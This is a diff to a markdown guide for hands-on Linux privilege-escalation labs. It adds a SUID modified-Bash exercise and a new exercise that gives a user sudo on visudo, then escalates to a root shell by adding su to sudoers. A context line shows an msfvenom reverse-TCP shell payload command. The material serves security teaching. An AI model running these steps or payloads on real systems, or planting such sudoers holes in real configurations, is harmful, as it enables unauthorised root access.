@@ -56,7 +56,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> 
 ### Configuration
 1. Add two additional users the box, with different passwords. These users should not be able to use `sudo`. Use the only one of the users for the following steps.
 2. Create a "Step 4" folder on the desktop of the first user.
-3. Build the modified Bash shell in the Linux PrivEsc folder in the repo with `./configure` and `make`. Name it `shell`.
+3. Build the modified Bash shell in the Linux PrivEsc/Lab 2 folder in the repo with `./configure` and `make`. Name it `shell`.
       * This modification always runs the Bash shell in privileged mode (so that the SUID bit won't be [ignored by default](https://www.gnu.org/software/bash/manual/bash.html)).
       * A pre-built `shell` for the Linux Exercises box is also in the folder.
 4. Place the `shell` in the `/usr/bin` folder.
@@ -74,6 +74,31 @@ chmod u-x /usr/bin
 1. Log on to the second user created in Configuration step 1.
 2. Execute the `/usr/bin/shell` file. A Bash shell should spawn with the permissions of the first user. Use `whoami` to verify this.
 
-## Lab Exercise 3: Linux Vertical PrivEsc
+## Lab Exercise 3: Linux Vertical PrivEsc via visudo
+### Configuration
+1. Using `sudo` as the first user, create a "Step 5" folder in the home directory of the root user.
+2. Use `visudo` to edit the `/etc/sudoers` file. Add a line for your second user to allow them to run `visudo` beneath the root user:
+      * A preconfigured `/etc/sudoers` file is `sudoers.old` in the Linux PrivEsc/Lab 3 folder in the repo as well.
+
+```
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+[second user name]	ALL=/usr/sbin/visudo
+```
+
+3. Save the file
+
+### Exploitation
+1. Run `visudo` as the second user.
+2. Append `,/usr/bin/su` to the privilege specifcation for the second user:
+
+```
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+[second user name]	ALL=/usr/sbin/visudo,/usr/bin/su
+```
+
+3. Save the file
+4. Run `sudo su` as the second user. A root shell will spawn.
 
 ## Puzzler: Correcting PrivEsc Vulnerabilities
